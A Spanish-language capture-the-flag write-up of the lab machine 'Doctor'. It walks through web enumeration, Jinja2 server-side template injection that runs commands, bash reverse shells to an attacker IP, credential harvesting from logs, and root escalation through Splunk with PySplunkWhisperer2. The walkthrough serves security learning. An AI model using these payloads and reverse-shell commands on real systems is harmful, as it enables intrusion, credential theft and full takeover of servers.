10.10.10.209
------------
1. Enumeracion

Puertos abiertos (script de bash): 22(ssh), 80(http), 8089(http)

El escaneo de nmap reporta lo siguiente:
```console
└─$ nmap -T5 10.10.10.209 -p22,80,8089 -sCV
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| http-robots.txt: 1 disallowed entry
```
Ya nos dicen que hay un robots txt que mirar.

```console
└─$ whatweb http://10.10.10.209  
http://10.10.10.209 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@doctors.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.209], JQuery[3.3.1], Script, Title[Doctor]
└─$ whatweb http://10.10.10.209:8089
ERROR Opening: http://10.10.10.209:8089 - Connection reset by peer
└─$ whatweb https://doctors.htb:8089   # Por https si
https://doctors.htb:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Splunkd], IP[10.10.10.209], Title[splunkd], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
```
El email es info@doctors.htb, eso indica el titulo de la web al que poner en el etc/hosts,


Enumeracion web:
``console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.209/FUZZ
000000536:   301        9 L      28 W       310 Ch      "css"                                                
000000939:   301        9 L      28 W       309 Ch      "js"                                                 
000000002:   301        9 L      28 W       313 Ch      "images"                                             
000002757:   301        9 L      28 W       312 Ch      "fonts" 
000095510:   403        9 L      28 W       277 Ch      "server-status"
```
Nada interesante, vamos a ver el splunkd

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://10.10.10.209:8089/FUZZ
000000068:   401        6 L      9 W        130 Ch      "services"                                           
000000998:   200        36 L     533 W      2178 Ch     "v2"                                                 
000002223:   200        36 L     533 W      2178 Ch     "v1"                                                 
000003349:   200        36 L     533 W      2178 Ch     "v3"                                                 
000005951:   200        36 L     533 W      2178 Ch     "v4"                                                 
000006750:   200        36 L     533 W      2178 Ch     "v5"                                                 
000007451:   200        36 L     533 W      2178 Ch     "v6"                                                 
000010676:   200        36 L     533 W      2178 Ch     "v7"                                                 
000020954:   200        36 L     533 W      2178 Ch     "v10"
```
Son todo rutas *vnumero* (suelen existir en las apis, ya investigare), todas devuelven 36 lineas asi que en 
wfuu oculto respuestas de ese tamaño con el parametro ```--hl=36``` pero ahi no encuentro nada. Recuerdo que 
habia un robots.txt en el nmap, existe pero no pone nada interesante.

WEB puerto 80
--------------

Las rutas de la pagina principal no conducen a nada, (no son funcionales), lo interesante que sacar es nombres
"Dr. Jade Guzman", "Dr. Hannah Ford" y "Dr. James Wilson", que puede que sean usuarios del sistema.

Si en vez de la ip pongo http://doctors.htb me sale una pagina complemtamente diferente:

```http://doctors.htb/login?next=%2F```

```console
http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
```

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://doctors.htb/FUZZ
000000051:   200        100 L    238 W      4493 Ch     "register"
000000049:   200        5 L      8 W        101 Ch      "archive"
000000335:   302        3 L      24 W       251 Ch      "account"
000000039:   200        94 L     228 W      4204 Ch     "login"
000000024:   302        3 L      24 W       245 Ch      "home"
000001211:   302        3 L      24 W       217 Ch      "logout"
```

Me he registrado con un nombre que incluye una comprobacion de STTI (si al ver el nombre pone cucuxii49 es 
vulnerable) > usaurio "cucuxii{{9*9}}" mail "cucuxii{{9*9}}@mail.com", contraseña "cucuxii123" pero por ahora no.
La cuenta es temporal segun esto, 20 minutos. 
Tengo una cookie de sesion > ".eJwljktqBDEMBe_idRbWz5LmMoMtySQEEuieWYXcfZqEWr1aPOqn3fdR53u7PY5nvbX7R7Zbm7I7SG615bRoW-nCRWuWCYQl18iYjJYOIuAEqhG5eHOhcg-AQKGBw9NEE9BqxB8StbsXI4ISh80c7DlkrujmNDuTQ7tCnmcd_zV4zTiPfX98f9bXJYYieteK4aTLsboFW10vqmTQoaTzImq_L9VKPeU.Y0fGCg.WNMwEmuC8pvT3TGVpBMmNQgIlAw"

La decodifique en base 64 pero no son mas que bytes inutiles.

La web me deja escribir un mensaje, pongo otro STTI ({{9*9}}) pero tampoco.

Arriba pone ```http://doctors.htb/home?page=1``` pero tras varios intentos no parece ser vulnerable a LFI.

La ruta /archive parece no tener nada, pero si vemos el codigo fuente sale un xml
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>81</title></item>
</channel>	
```
Ese 81 de ahi que es? Pued nada mas ni nada menos que el resultado del STTI de antes que pusimos en New Message
```{{9*9}}```

Si pongo en mensaje (para luego ver en el archive este)
```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}```
Me sale blog y blog.sh (o sea el output del comando):
```{{config.__class__.__init__.__globals__['os'].popen('cat ~/.ssh/id_rsa').read()}}``` nada
```{{config.__class__.__init__.__globals__['os'].popen('ping -c 1 10.10.14.5').read()}}``` 
Me llega la traza ```sudo tcpdump -i tun0 icmp -n``` asi que tenemos ejecucion remota de comandos.

Reverse shell:
```{{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'").read()}}```
```console
└─$ sudo nc -nlvp 443
web@doctor:~$ whoami
web
```
Tras una enumeracion sin encontrar capabilities ni nada del estilo di con que el usuario es del grupo adm
asi que puede leer los logs.
```console
web@doctor:/home$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:/var/log$ grep -rIE "password" 2>/dev/null
apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

Con esas creds "shaun:Guitar123" te puedes conectar a la web dle puerto 8089. Como hay demasiadas rutas, puse
pentesting splunkd en Hacktricks y acabe en esta [pagina](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)
Ahi hablaban del script PySplunkWhisperer2 que me baje despues de guithub
```
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --user shaun --password Guitar123 --lhost 10.10.14.5  --payload "whoami | nc 10.10.14.5 444"
└─$ sudo nc -nlvp 444 
root
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --user shaun --password Guitar123 --lhost 10.10.14.5  --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.5/444 0>&1'"
root@doctor:/# whoami
root
```





